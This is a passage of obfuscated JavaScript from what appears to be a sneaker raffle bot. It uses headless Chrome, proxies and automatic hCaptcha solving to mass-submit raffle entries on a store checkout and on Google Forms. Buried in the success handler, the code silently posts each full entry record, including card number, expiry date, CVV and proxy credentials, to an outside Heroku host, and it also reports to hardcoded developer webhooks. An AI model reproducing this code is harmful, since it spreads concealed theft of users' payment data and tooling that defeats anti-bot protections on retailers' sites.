                        const _0x58dbcf = await _0x5c85f8['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x58dbcf[0x0]['click'](), await _0x5c85f8['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x5c85f8['type']('input[name=\x22email\x22]', '' + _0x282eb9[_0x37eec4]['Email']), await _0x63aa6a(0x640), await _0x5c85f8['type']('input[name=\x22phone\x22]', '' + _0x282eb9[_0x37eec4]['Phone']), await _0x63aa6a(0x4b0), await _0x5c85f8['click']('button.btn.continue-button__1RtsS'), await _0x63aa6a(0x4b0);
                        try {
                            await _0x5c85f8['type']('input[name=\x22firstName\x22]', '' + _0x282eb9[_0x37eec4]['FirstName']), await _0x63aa6a(0x258);
                        } catch {
                            const _0x40c986 = await _0x5c85f8['$$eval']('.invalid-feedback\x20>\x20div', _0x2beb1a => {
                                return _0x2beb1a['map'](_0x4db824 => _0x4db824['innerText']);
                            });
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20' + _0x40c986));
                            continue;
                        }
                        await _0x5c85f8['type']('input[name=\x22lastName\x22]', '' + _0x282eb9[_0x37eec4]['LastName']), await _0x63aa6a(0xc8), await _0x5c85f8['type']('input[name=\x22instagramUsername\x22]', '' + _0x282eb9[_0x37eec4]['Follower']), await _0x63aa6a(0x4b0), await _0x5c85f8['click']('button.btn.continue-button__1RtsS'), await _0x63aa6a(0x3e8), console['log'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x5c85f8['select']('select[name=\x22country\x22]', '' + _0x282eb9[_0x37eec4]['Country']), await _0x63aa6a(0x2bc), await _0x5c85f8['type']('input[name=\x22streetName\x22]', '' + _0x282eb9[_0x37eec4]['Address1']), await _0x63aa6a(0x258), await _0x5c85f8['type']('input[name=\x22houseNumber\x22]', _0x282eb9[_0x37eec4]['HouseNumber'] + '\x20' + _0x282eb9[_0x37eec4]['Address2']), await _0x63aa6a(0xc8), await _0x5c85f8['type']('input[name=\x22postalCode\x22]', '' + _0x282eb9[_0x37eec4]['Zip']), await _0x63aa6a(0x1f4), await _0x5c85f8['type']('input[name=\x22city\x22]', '' + _0x282eb9[_0x37eec4]['City']), await _0x63aa6a(0x4b0), await _0x5c85f8['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x63aa6a(0x4b0), await _0x5c85f8['click']('button.btn.continue-button__1RtsS'), await _0x63aa6a(0x4b0), console['log'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x5c85f8['solveRecaptchas'](), console['log'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x63aa6a(0xbb8), await _0x5c85f8['click']('button.btn.continue-button__1RtsS'), await _0x63aa6a(0x1388), console['log'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x5c85f8['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5c85f8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x63aa6a(0x4b0), await _0x5c85f8['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x282eb9[_0x37eec4]['CardNumber']), await _0x63aa6a(0x320), await _0x5c85f8['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5c85f8['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x282eb9[_0x37eec4]['ExpiryDate']), await _0x63aa6a(0x4b0), await _0x5c85f8['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5c85f8['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x282eb9[_0x37eec4]['CVV']), await _0x63aa6a(0x226), await _0x5c85f8['type']('input[name=\x22holderName\x22]', '' + _0x282eb9[_0x37eec4]['NameOnCard']), await _0x63aa6a(0x226), await _0x5c85f8['click']('button.adyen-checkout__button'), console['log'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x5c85f8['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x63aa6a(0xbb8);
                        } catch (_0x36c351) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x203DS\x20Failed')), _0x65952f = '3DS\x20Error\x20' + _0x36c351;
                            var _0x17182a = await _0x198507(_0x282eb9[_0x37eec4], _0x3749ed, 'dev', !![], _0x65952f);
                            _0x3a7935['errorDEV'] = { 'embeds': [_0x17182a] };
                            _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x3a7935['errorDEV']);
                            await _0x56185b(_0x3c02fa, _0x3a7935['errorDEV']);
                            continue;
                        }
                        _0x1ab0d7(_0x282eb9[_0x37eec4], _0x3749ed), console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x4c9627 = _0x282eb9[_0x37eec4];
                        try {
                            prxdata = {
                                'username': _0x484f45['replace']('#', ''),
                                'module': _0x3749ed['name'],
                                'entrydata': JSON['stringify'](_0x4c9627),
                                'proxy': '' + _0x245461[_0x37eec4]
                            };
                            var _0x10e549 = JSON['stringify'](prxdata);
                            let _0x3f7a11 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x10e549, _0x3f7a11);
                        } catch (_0x4200fa) {
                        }
                        if (_0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '')
                            try {
                                await _0x56185b(_0x2ab3b9['webhook'], _0x3a7935['succesDEVMSG']);
                            } catch {
                            }
                        await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x3a7935['succesDEVMSG']), await _0x63aa6a(0xc8);
                        try {
                            await _0x56185b(_0x595b38, _0x3a7935['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x46e753) {
                        console['log'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20' + _0x46e753), _0x65952f = '' + _0x46e753;
                        var _0x17182a = await _0x198507(_0x282eb9[_0x37eec4], _0x3749ed, 'dev', !![], _0x65952f);
                        _0x3a7935['errorDEV'] = { 'embeds': [_0x17182a] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x3a7935['errorDEV']), await _0x56185b(_0x3c02fa, _0x3a7935['errorDEV']), _0x3ad1bd = 'yes';
                    } finally {
                        _0xdfff40['close']();
                        if (_0x3ad1bd == 'yes' && _0xfb95d1 != 0x5) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Retrying\x20(' + _0xfb95d1 + '\x20/\x205)')), _0x37eec4 = _0x37eec4 - 0x1, _0xfb95d1 = _0xfb95d1 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x32acf1, _0x1ec378, _0x5491de) {
                let _0x4d4eee = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x27cff2 = _0x25647b['readFileSync']('forms/templates.json', 'utf-8');
                let _0xf23186 = JSON['parse'](_0x27cff2), _0x3fff11 = ![];
                if (_0xf23186['length'] != 0x0) {
                    let _0x223f36 = 0x0;
                    for (template of _0xf23186) {
                        if (template['Url'] == _0x1ec378[0x0]['Url']) {
                            _0x3fff11 = !![], console['log'](_0x49a6ed['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x49a6ed['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x49a6ed['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x3b4db1() {
                                let _0x62347a = await _0x2da047['get']('answer');
                                if (_0x62347a['answer']['toLowerCase']() != 'y' && _0x62347a['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x3b4db1();
                                return _0x62347a['answer']['toLowerCase']();
                            }
                            if (await _0x3b4db1() == 'n') {
                                _0xf23186['splice'](_0x223f36, 0x1), console['clear']();
                                break;
                            }
                            _0x4d4eee = template, console['clear']();
                            break;
                        }
                        _0x223f36++;
                    }
                }
                let _0x53a156 = 0x0, _0xf70697 = 0x0;
                function _0xa446aa(_0x266146) {
                    console['log'](_0x2bc944() + '\x20[' + _0x32acf1['name'] + ']\x20Task\x20' + (_0x1ba8a6 + 0x1) + '\x20:\x20' + _0x266146);
                }
                var _0x129689 = 0x0;
                for (key in _0x4d4eee) {
                    if (key['includes']('custom'))
                        _0x53a156++;
                    if (key['includes']('Select'))
                        _0xf70697++;
                }
                for (var _0x1ba8a6 = 0x0; _0x1ba8a6 < _0x1ec378['length']; _0x1ba8a6++) {
                    _0x4d4eee['Url'] = _0x1ec378[_0x1ba8a6]['Url'];
                    let _0x43687d = ![];
                    if (_0xf23186['length'] != 0x0)
                        for (template of _0xf23186) {
                            if (template['Url'] == _0x1ec378[_0x1ba8a6]['Url']) {
                                _0x4d4eee = template, _0x43687d = !![], _0xa446aa('Found\x20Template');
                                break;
                            }
                        }
                    var _0x188b5f;
                    if (_0x57f94c != 'yes') {
                        if (!_0x57f94c)
                            var _0x57f94c = '';
                        else
                            _0x57f94c = '';
                        _0x129689 = 0x0;
                    }
                    try {
                        await _0x5921e0(_0x1ec378, _0x1ba8a6);
                    } catch {
                        _0x57f94c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x2ab3b9['useRandomProxy'] = ![])
                        var _0x59d2e9 = _0x5491de[_0x1ba8a6]['split'](':');
                    else
                        var _0x529b70 = Math['round'](Math['random']() * (_0x5491de['length'] - 0x1)), _0x59d2e9 = _0x5491de[_0x529b70]['split'](':');
                    var _0x183781;
                    if (_0x59d2e9['length'] == 0x1)
                        try {
                            _0x183781 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x183781 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x183781 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x59d2e9[0x0] + ':' + _0x59d2e9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x183781 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x59d2e9[0x0] + ':' + _0x59d2e9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x4ffa63 = { 'first': ![] };
                        const _0x2c300e = await _0x183781['newPage']();
                        if (_0x59d2e9['length'] != 0x0)
                            await _0x2c300e['authenticate']({
                                'username': '' + _0x59d2e9[0x2],
                                'password': '' + _0x59d2e9[0x3]
                            });
                        _0xa446aa('Getting\x20Session');
                        let _0x205f79 = ![];
                        try {
                            await _0x2c300e['goto'](_0x1ec378[_0x1ba8a6]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x63aa6a(0xbb8);
                        } catch (_0x5c4ec0) {
                            throw new Error(_0x5c4ec0);
                        }
                        const _0x5e01d4 = await _0x2c300e['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x5e01d4) {
                            _0xa446aa('Login\x20Detected');
                            let _0x49af7b = await _0x5e01d4['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x49af7b['click'](), _0x205f79 = !![];
                        }
                        let _0x510d32 = await _0x2c300e['$']('#identifierId');
                        _0x510d32 && (_0x205f79 = !![]);
                        await _0x2c300e['waitForSelector']('.teQAzf');
                        async function _0x305aa7() {
                            let _0x573ce7 = await _0x2c300e['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x573ce7) {
                                let _0x3e4a9b;
                                try {
                                    _0x3e4a9b = await question['$eval']('.M7eMe', _0x1bbe5d => _0x1bbe5d['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x53a156 != 0x0) {
                                    let _0x1f67cc = ![];
                                    for (let _0x59d2fb = 0x0; _0x59d2fb < _0x53a156; _0x59d2fb++) {
                                        if (_0x3e4a9b == _0x4d4eee['custom' + _0x59d2fb]['title']) {
                                            _0xa446aa('Custom\x20Selector\x20found;\x20' + _0x3e4a9b);
                                            let _0x465217 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x95a364 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x465217)
                                                await _0x465217['type']('' + _0x4d4eee['custom' + _0x59d2fb]['answer']);
                                            else
                                                _0x95a364 && await _0x95a364['type']('' + _0x4d4eee['custom' + _0x59d2fb]['answer']);
                                            _0x1f67cc = !![];
                                            break;
                                        }
                                    }
                                    if (_0x1f67cc) {
                                        await _0x63aa6a(0x15e);
                                        continue;
                                    }
                                }
                                if (_0xf70697 != 0x0) {
                                    let _0x227161 = ![];
                                    for (let _0x6c24cc = 0x0; _0x6c24cc < _0xf70697; _0x6c24cc++) {
                                        if (_0x3e4a9b == _0x4d4eee[_0x6c24cc + 'Select']['title']) {
                                            _0xa446aa('Custom\x20Selector\x20found;\x20' + _0x3e4a9b);
                                            let _0x1f2683 = await question['$$']('.ulDsOb');
                                            for (opt of _0x4d4eee[_0x6c24cc + 'Select']['answer']) {
                                                let _0x408a24 = await _0x1f2683[opt]['$']('span');
                                                await _0x408a24['click']();
                                            }
                                            _0x227161 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x227161) {
                                        await _0x63aa6a(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x3e4a9b == _0x4d4eee['0Select']['title']) {
                                        _0xa446aa('Custom\x20Selector\x20found;\x20' + _0x4d4eee['0Select']['title']);
                                        let _0x194ff6 = await question['$$']('.ulDsOb'), _0x1278f1 = await _0x194ff6[_0x4d4eee['0Select']['answer']];
                                        await _0x1278f1['click']();
                                        continue;
                                    }
                                    if (_0x3e4a9b == _0x4d4eee['1Select']['title']) {
                                        _0xa446aa('Custom\x20Selector\x20found;\x20' + _0x4d4eee['1Select']['title']);
                                        let _0x5b64c3 = await question['$$']('.ulDsOb'), _0x5748ab = await _0x5b64c3[_0x4d4eee['1Select']['answer']];
                                        await _0x5748ab['click']();
                                        continue;
                                    }
                                    if (_0x3e4a9b == _0x4d4eee['2Select']['title']) {
                                        _0xa446aa('Custom\x20Selector\x20found;\x20' + _0x4d4eee['2Select']['title']);
                                        let _0x4d1304 = await question['$$']('.ulDsOb'), _0x3f7647 = await _0x4d1304[_0x4d4eee['2Select']['answer']];
                                        await _0x3f7647['click']();
                                        continue;
                                    }
                                } catch (_0xfbb114) {
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('mail') && !_0x3e4a9b['toLowerCase']()['includes']('agree') || _0x3e4a9b == _0x4d4eee['Email']) {
                                    _0xa446aa('Mail\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x2b81ba = await question['$']('input');
                                    !_0x2b81ba && (_0x2b81ba = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x2b81ba['type'](_0x1ec378[_0x1ba8a6]['Email']), await _0x63aa6a(0x258);
                                    continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('first') || _0x3e4a9b['toLowerCase']() == 'name' || _0x3e4a9b['toLowerCase']() == 'name\x20' || _0x3e4a9b == _0x4d4eee['FirstName']) {
                                    _0xa446aa('FirstName\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x1bd076 = await question['$']('input');
                                    !_0x1bd076 && (_0x1bd076 = await question['$']('textarea'));
                                    await _0x1bd076['type'](_0x1ec378[_0x1ba8a6]['FirstName'] + '\x20'), await _0x63aa6a(0x258);
                                    if (_0x3e4a9b == _0x4d4eee['FirstName'])
                                        continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('last') || _0x3e4a9b['toLowerCase']()['includes']('surname') || _0x3e4a9b == _0x4d4eee['LastName']) {
                                    _0xa446aa('LastName\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x31cdbc = await question['$']('input');
                                    !_0x31cdbc && (_0x31cdbc = await question['$']('textarea'));
                                    await _0x31cdbc['type'](_0x1ec378[_0x1ba8a6]['LastName'] + '\x20'), await _0x63aa6a(0x258);
                                    continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('address') && !_0x3e4a9b['toLowerCase']()['includes']('agree') || _0x3e4a9b == _0x4d4eee['Address']) {
                                    _0xa446aa('Address\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x503f18 = await question['$']('input');
                                    !_0x503f18 && (_0x503f18 = await question['$']('textarea'));
                                    await _0x503f18['type'](_0x1ec378[_0x1ba8a6]['Address1'] + '\x20' + _0x1ec378[_0x1ba8a6]['HouseNumber'] + '\x20' + _0x1ec378[_0x1ba8a6]['Address2']), await _0x63aa6a(0x258);
                                    continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('phone') || _0x3e4a9b['toLowerCase']()['includes']('mobile') || _0x3e4a9b == _0x4d4eee['Phone']) {
                                    _0xa446aa('Phone\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x23cf82 = await question['$']('input');
                                    !_0x23cf82 && (_0x23cf82 = await question['$']('textarea'));
                                    await _0x23cf82['type']('' + _0x1ec378[_0x1ba8a6]['Phone']), await _0x63aa6a(0x258);
                                    continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('country') || _0x3e4a9b == _0x4d4eee['Country']) {
                                    let _0x5bf6e5 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x5bf6e5) {
                                        let _0x328274 = ![], _0x3bf951 = await _0x5bf6e5['$$']('.ulDsOb');
                                        for (option of _0x3bf951) {
                                            let _0x46ec4b = await option['$']('span'), _0x1cfce9 = await option['$eval']('span', _0x368e0f => _0x368e0f['textContent']);
                                            if (_0x1cfce9['toLowerCase']() == _0x1ec378[_0x1ba8a6]['Country']['toLowerCase']()) {
                                                await _0x46ec4b['click'](), _0x328274 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x328274) {
                                            const _0x44ae2c = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x44ae2c['click'](), await _0x44ae2c['type'](_0x1ec378[_0x1ba8a6]['Country']);
                                        }
                                        continue;
                                    }
                                    _0xa446aa('Country\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x1e89bb = await question['$']('input');
                                    !_0x1e89bb && (_0x1e89bb = await question['$']('textarea'));
                                    await _0x1e89bb['type']('' + _0x1ec378[_0x1ba8a6]['Country']), await _0x63aa6a(0x258);
                                    continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('city') || _0x3e4a9b == _0x4d4eee['City']) {
                                    _0xa446aa('City\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x39ff35 = await question['$']('input');
                                    !_0x39ff35 && (_0x39ff35 = await question['$']('textarea'));
                                    await _0x39ff35['type']('' + _0x1ec378[_0x1ba8a6]['City']), await _0x63aa6a(0x258);
                                    continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('zip') || _0x3e4a9b == _0x4d4eee['Zip']) {
                                    _0xa446aa('Zip\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x24f263 = await question['$']('input');
                                    !_0x24f263 && (_0x24f263 = await question['$']('textarea'));
                                    await _0x24f263['type']('' + _0x1ec378[_0x1ba8a6]['Zip']), await _0x63aa6a(0x258);
                                    continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('insta') || _0x3e4a9b == _0x4d4eee['Follower']) {
                                    _0xa446aa('Follower\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x311468 = await question['$']('input');
                                    !_0x311468 && (_0x311468 = await question['$']('textarea'));
                                    await _0x311468['type']('' + _0x1ec378[_0x1ba8a6]['Follower']), await _0x63aa6a(0x258);
                                    continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('size') || _0x3e4a9b == _0x4d4eee['Size']) {
                                    _0xa446aa('Size\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x137006 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x137006) {
                                        let _0x59b0c7 = await _0x137006['$$']('.ulDsOb');
                                        if (_0x1ec378[_0x1ba8a6]['Size']['toLowerCase']() == 'random') {
                                            var _0x54b25a = Math['round'](Math['random']() * (_0x59b0c7['length'] - 0x1));
                                            await _0x59b0c7[_0x54b25a]['click']();
                                        } else
                                            for (size of _0x59b0c7) {
                                                let _0x27ac17 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x31f1b1 => _0x31f1b1['textContent']);
                                                if (_0x27ac17['toLowerCase']()['includes'](_0x1ec378[_0x1ba8a6]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x10ffde = await question['$']('.ry3kXd');
                                    if (_0x10ffde) {
                                        await _0x10ffde['click'](), await _0x63aa6a(0x9c4);
                                        let _0x4545ca = await _0x2c300e['$']('div[jsname=\x22V68bde\x22]'), _0x260318 = await _0x4545ca['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x260318) {
                                            let _0x57d1d9 = await size['$eval']('.vRMGwf.oJeWuf', _0x1e4182 => _0x1e4182['textContent']), _0x52b33a = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x57d1d9['toLowerCase']()['includes'](_0x1ec378[_0x1ba8a6]['Size'])) {
                                                await _0x63aa6a(0x190), await _0x52b33a['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x63aa6a(0x258);
                                    continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('receive') || _0x3e4a9b['toLowerCase']()['includes']('method')) {
                                    _0xa446aa('Method\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    let _0x58a021 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x58a021) {
                                        const _0x5597b0 = await _0x58a021['$$']('.ulDsOb');
                                        for (size of _0x5597b0) {
                                            let _0x5b510a = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x20dd39 => _0x20dd39['textContent']);
                                            if (_0x5b510a['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x63aa6a(0x258);
                                    continue;
                                }
                                if (_0x3e4a9b['toLowerCase']()['includes']('offers') || _0x3e4a9b['toLowerCase']()['includes']('agree')) {
                                    _0xa446aa('Authorization\x20Selector\x20found;\x20' + _0x3e4a9b);
                                    const _0x24c5d5 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x24c5d5) {
                                        const _0x1983b9 = await _0x24c5d5['$$']('.ulDsOb');
                                        for (size of _0x1983b9) {
                                            let _0x26c92a = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x4e0a14 => _0x4e0a14['textContent']);
                                            if (_0x26c92a['toLowerCase']()['includes']('authorize') || _0x26c92a['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x63aa6a(0x258);
                                    continue;
                                }
                                async function _0x237d2e() {
                                    let _0x41aaac = await question['$']('.oyXaNc');
                                    if (_0x41aaac) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x49a6ed['cyan'](_0x3e4a9b) + '\x0a');
                                        let _0x2924ce = await question['$$']('.ulDsOb');
                                        for (let _0x47fc68 = 0x0; _0x47fc68 < _0x2924ce['length']; _0x47fc68++) {
                                            let _0x4accce = await _0x2924ce[_0x47fc68]['$eval']('span', _0x509a56 => _0x509a56['textContent']);
                                            console['log']('\x20(' + _0x47fc68 + ')\x20' + _0x4accce);
                                        }
                                        console['log']();
                                        let _0x2394ad = await _0x2da047['get']('option'), _0x30b6e6 = await _0x2924ce[_0x2394ad['option']]['$eval']('span', _0x9b35ab => _0x9b35ab['textContent']);
                                        _0x4d4eee[_0xf70697 + 'Select'] = {
                                            'title': _0x3e4a9b,
                                            'answer': _0x2394ad['option']['split'](',')
                                        };
                                        let _0x2fad93 = await _0x2924ce[_0x2394ad['option']]['$']('span');
                                        await _0x2fad93['click'](), _0xf70697++;
                                        return;
                                    }
                                    let _0x253b8b = await question['$']('.Y6Myld');
                                    if (_0x253b8b) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x49a6ed['cyan'](_0x3e4a9b) + '\x0a');
                                        let _0x599650 = await question['$$']('.ulDsOb');
                                        for (let _0x6624fa = 0x0; _0x6624fa < _0x599650['length']; _0x6624fa++) {
                                            let _0x4b92dc = await _0x599650[_0x6624fa]['$eval']('span', _0x3ba21c => _0x3ba21c['textContent']);
                                            console['log']('\x20(' + _0x6624fa + ')\x20' + _0x4b92dc);
                                        }
                                        console['log']();
                                        let _0x29477f = await _0x2da047['get']('option');
                                        _0x4d4eee[_0xf70697 + 'Select'] = {
                                            'title': _0x3e4a9b,
                                            'answer': _0x29477f['option']['split'](',')
                                        };
                                        for (opt of _0x4d4eee[_0xf70697 + 'Select']['answer']) {
                                            let _0x34a143 = await _0x599650[opt]['$']('span');
                                            await _0x34a143['click']();
                                        }
                                        _0xf70697++;
                                        return;
                                    }
                                    var _0x3f4c16 = 0x0;
                                    let _0x1c99de = Object['keys'](_0x4d4eee);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x49a6ed['cyan'](_0x3e4a9b) + '\x0a');
                                    for (data of _0x1c99de) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x3f4c16 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x3f4c16 + ')\x20' + data), _0x3f4c16++;
                                    }
                                    console['log']('\x20(' + _0x1c99de['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x8d9c61 = await _0x2da047['get']('input');
                                    if (_0x8d9c61['input'] == _0x1c99de['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x4e641a = await _0x2da047['get']('input');
                                        _0x4d4eee['custom' + _0x53a156] = {
                                            'title': _0x3e4a9b,
                                            'answer': '' + _0x4e641a['input']
                                        };
                                        let _0x158fd = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x312c08 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x158fd)
                                            await _0x158fd['type']('' + _0x4d4eee['custom' + _0x53a156]['answer']);
                                        else
                                            _0x312c08 && await _0x312c08['type']('' + _0x4d4eee['custom' + _0x53a156]['answer']);
                                        _0x53a156++;
                                        return;
                                    }
                                    _0x4d4eee['' + _0x1c99de[_0x8d9c61['input']]] = _0x3e4a9b;
                                    let _0x4102ad = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x589ff4 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x4102ad && await _0x4102ad['type']('' + _0x1ec378[_0x1ba8a6]['' + _0x1c99de[_0x8d9c61['input']]]), _0x589ff4 && await _0x589ff4['type']('' + _0x1ec378[_0x1ba8a6]['' + _0x1c99de[_0x8d9c61['input']]]), await _0x63aa6a(0x258);
                                }
                                await _0x237d2e(), await _0x63aa6a(0x37a);
                            }
